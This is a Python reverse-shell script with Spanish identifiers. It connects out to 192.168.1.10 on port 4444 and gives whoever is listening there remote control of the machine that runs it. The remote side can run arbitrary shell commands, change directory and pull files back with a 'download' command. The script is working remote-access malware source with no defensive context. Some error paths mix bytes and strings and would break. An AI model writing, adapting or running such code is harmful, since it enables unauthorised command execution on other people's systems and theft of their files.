import socket
import subprocess
import os

def main():
    conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conexion.connect(("192.168.1.10", 4444))

        def ejecutar_comando(comando):
            try:
                resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                return resultado
            except Exception as e:
                return str(e).encode()

        def cambiar_directorio(path):
            try:
                os.chdir(path)
                return "[+] Cambiando a {}".format(os.getcwd())
            except Exception as e:
                return str(e).encode()

        def enviar_archivo(path):
            try:
                with open(path, "rb") as file:
                    contenido = file.read(1024)
                    while contenido:
                        conexion.send(contenido)
                        contenido = file.read(1024)
                return "[+] Envío completo"
            except Exception as e:
                return str(e).encode()

        while True:
            comando = conexion.recv(1024).decode()
            if comando.lower() == "exit":
                conexion.close()
                break
            elif comando.startswith("cd"):
                mensaje = cambiar_directorio(comando[3:])
                conexion.send(mensaje.encode())
            elif comando.startswith("download"):
                file_path = comando.split(" ")[1]
                mensaje = enviar_archivo(file_path)
                conexion.send(mensaje.encode())
            else:
                res = ejecutar_comando(comando)
                conexion.send(res)

    except Exception as e:
        print("Error:", str(e))
    finally:
        conexion.close()

if __name__ == "__main__":
    main()




